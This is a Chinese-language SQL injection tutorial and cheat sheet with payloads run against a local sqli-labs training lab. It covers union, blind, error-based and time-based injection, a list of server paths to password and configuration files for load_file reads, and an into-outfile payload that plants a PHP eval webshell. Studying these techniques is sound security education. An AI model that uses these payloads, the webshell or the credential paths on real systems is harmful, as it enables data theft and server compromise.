#SQL注入

## 几个常用函数：

### 系统函数

- version()：MySQL版本
- user()：数据库用户名
- database()：数据库名
- @@datadir：数据库路径
- @@version_compile_os：操作系统版本

### 字符串连接函数

- concat(str1,str2,…)：没有分隔符的连接字符串
- concat_ws(separator,str1,str2,…)：含有分隔符的连接字符串
- group_concat(str1,str2,…)：链接一个组的所有字符串，并以逗号分隔每一条数据

### union操作符介绍

union操作符用于合并两个或多个select语句的结果集。请注意，union内部的select语句必须拥有相同数量的列。列也必须拥有相似的数据类型，同时，每条select语句中的列的顺序必须相同。

- SQL union语法：
    
        select column_name(s) from table_name1 
        union 
        select column_name(s) from table_name2

- SQL union all语法：

        select column_name(s) from table_name1 
        union all
        select column_name(s) from table_name2

### SQL中的逻辑运算：

- select * from users where id=1 and 1=1;
- select * from users where id=1 && 1=1;
- select * from users where id=1 & 1=1;

### 注入流程：

数据库 -> 数据表 -> 列 -> 数据项

查看表结构：desc 表名; show columns from 表名;

**MySQL数据库有一个存储所有数据库信息的information_schema**

- 猜数据库：select schema_name from information_schema.schemata;
- 猜某库的数据表：select table_name from information_schema.tables where table_schema=’xxx’;
- 猜某表的所有列：select column_name from information_schema.columns where table_name=’xxx’;
- 获取某列的内容：select *** from ***;

### 注入示例：

    1. http://127.0.0.1/sqllib/?id=1’ order by 列数--+    #如果超过查询的列数则报错。
    2. http://127.0.0.1/sqllib/?id=-1’ union select 1,2--+    # 可以确定数据表列数。
    3. http://127.0.0.1/sqllib/?id=-1’ union select 1,database()--+    # 获取数据库名称。
    4. http://127.0.0.1/sqllib/?id=-1’ union select 1,group_concat(schema_name) from information_schema.schemata--+    # 爆数据库。
    5. http://127.0.0.1/sqllib/?id=-1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’数据库名’--+    # 爆某数据库的数据表。
    6. http://127.0.0.1/sqllib/?id=-1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’表名’--+    # 爆某数据表的列。
    7. http://127.0.0.1/sqllib/?id=-1’ union select 列名 from 表名--+    # 爆数据。

### 盲注：

- 基于布尔SQL盲注，构造逻辑判断
        
        1. left(database(),1)>'s'
        2. ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+
        3. ascii(substr((select database()),1,1))=98
        4. ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))>98--+

- 正则注入：

        1. select user() regexp ‘^[a-z]’

        示例：
        1. select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0))
        2. select * from users where id=1 and 1=(user() regexp ‘^ri’)
        3. select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1)

- like匹配注入

        select user() like ‘ro%’

- 基于报错的SQL盲注，构造payload让信息通过错误提示回显出来

        select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) from a information_schema.columns group by a;
        简化为：select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));
        
        如果关键的表被禁用了，可以使用：
        select count(*) from (select 1 union select null union select !1) group by concat(version,floor(rand(0)*2));

        如果rand被禁用可以使用用户变量来报错：
        select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)

        select exp(~(select * from (select user())a));
        select !(select * from (select user())x)-~0
        extractvalue(1,concat(0x7e,(select @@version),0x7e))
        updatexml(1,concat(0x7e,(select @@version),0x7e),1)
        select * from (select name_const(version(),1),name_const(version(),1))x;

- 基于时间的SQL盲注，延时注入
   
        if(ascii(substr(database(),1,1))>115,0,sleep(5))--+
        union select if(substring(current,1,1)=char(119),benchmark(5000000,encode(‘msg’,’by 5 seconds’)),null) from (select database() as current) as tb1;

**注入示例：**

    1. http://192.168.127.133/sqli/Less-5/index.php?id=1' and left(version(),1)=5--+    
    查看数据库版本是否为5，如果版本不对则报错
    2. http://192.168.127.133/sqli/Less-5/index.php?id=1' and length(database())=8--+
    查看数据库长度，如果不是则报错
    3. http://192.168.127.133/sqli/Less-5/index.php?id=1' and left(database(),1)>'s'--+
    猜测数据库名称的第一位
    4. http://192.168.127.133/sqli/Less-5/index.php?id=1' and left(database(),2)>'se'--+
    猜测数据库名称的第二位
    5. http://192.168.127.133/sqli/Less-5/index.php?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+
    猜解某数据库的表名
    6. http://192.168.127.133/sqli/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+
    获取某表中的列
    7. http://192.168.127.133/sqli/Less-5/?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+
    获取数据表的内容

**报错注入：**

    1. http://192.168.127.133/sqli/Less-5/?id=1' union select(exp(~(select * FROM(SELECT USER())a))),2,3--+
    利用double数值类型超出范围进行报错注入
    2. http://192.168.127.133/sqli/Less-5/?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a--+
    3. http://192.168.127.133/sqli/Less-5/?id=1' union select(!(select * from(select user())x)-~0),2,3--+
    利用big int溢出进行报错注入
    4. http://192.168.127.133/sqli/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select@@version),0x7e))--+
    利用xpath报错注入
    5. http://192.168.127.133/sqli/Less-5/?id=1' and updatexml(1,concat(0x7e,(select@@version),0x7e),1)--+
    6. http://192.168.127.133/sqli/Less-5/?id=1' union select 1,2,3 from(select NAME_CONST(version(),1),NAME_CONST(version(),1)) x--+
    利用重复数据注入

**延时注入：**

    1. http://192.168.127.133/sqli/Less-5/?id=1' and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+
    当错误的时候会有5秒时间延迟
    2. http://192.168.127.133/sqli/Less-5/?id=1' UNION SELECT(IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by5seconds')),null)),2,3 FROM (select database() as current) as tb1--+
    利用benchmark()进行延时注入

**导入导出相关操作：**

load_file()导出文件

使用条件：

（1）必须有权限读取并且文件必须完全可读 and (select count(*) from mysql.user)>0/*如果结果返回正常，说明具有可读写权限*/，and (select count(*) from mysql.user)>0/*返回错误，应该是管理员给数据库账号降权*/

（2）欲读取文件必须在服务器上

（3）必须指定文件的完整路径

（4）欲读取文件必须小于max_allowed_packet。如果文件不存在或者因为上面任一原因不能被读取，函数返回空。

**Mysql注入load_file常用路径：**

    WINDOWS下:
    c:/boot.ini //查看系统版本
    c:/windows/php.ini //php配置信息
    c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码
    c:/winnt/php.ini
    c:/winnt/my.ini
    c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码
    c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码
    c:\Program Files\Serv-U\ServUDaemon.ini
    c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置
    c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码
    c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此
    c:\Program Files\RhinoSoft.com\ServUDaemon.exe
    C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件
    //存储了pcAnywhere的登陆密码
    c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件
    c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.
    c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
    d:\APACHE\Apache2\conf\httpd.conf
    C:\Program Files\mysql\my.ini
    C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码

    LUNIX/UNIX 下:
    /usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
    /usr/local/apache2/conf/httpd.conf
    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
    /usr/local/app/php5/lib/php.ini //PHP相关设置
    /etc/sysconfig/iptables //从中得到防火墙规则策略
    /etc/httpd/conf/httpd.conf // apache配置文件
    /etc/rsyncd.conf //同步程序配置文件
    /etc/my.cnf //mysql的配置文件
    /etc/redhat-release //系统版本
    /etc/issue
    /etc/issue.net
    /usr/local/app/php5/lib/php.ini //PHP相关设置
    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟   网站设置
    /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
    /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
    /usr/local/resin-pro-3.0.22/conf/resin.conf 同上
    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
    /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件
    /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
    /usr/local/resin-pro-3.0.22/conf/resin.conf 同上
    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
    /etc/sysconfig/iptables 查看防火墙策略
    load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录
    replace(load_file(0×2F6574632F706173737764),0×3c,0×20)
    replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))

文件导入到数据库
    
load data infile语句用于从一个文本文件中读取行，并装入一个表中。

导入到文件：

Select … into outfile ‘file_name’


**示例：**

    1. http://192.168.127.133/sqli/Less-7/?id=1')) union select 1,2,3 into outfile "e:\\Software\\Xampp\\htdocs\\sqli\\Less-7\\uuu.txt"--+
    2. http://192.168.127.133/sqli/Less-7/?id=1')) union select 1,2,'<?php @eval($_POST[“mima”]) ?>' into outfile "e:\\Software\\Xampp\\htdocs\\sqli\\Less-7\\muma.php"--+
    导入一句话木马

**基于时间的注入，正确时直接返回**

    1. http://192.168.127.133/sqli/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(3))--+
    猜测数据库
    2. http://192.168.127.133/sqli/Less-9/?id=1'and If(ascii(substr(database(),2,1))=101,1,sleep(5))--+
    猜测某数据库的数据表
    3. http://192.168.127.133/sqli/Less-9/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=15,1,sleep(5))--+
    猜解某表的列
    4. http://192.168.127.133/sqli/Less-9/?id=1' and if(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+
    猜解某一列的值

堆叠注入


自动化注入工具：sqlmap

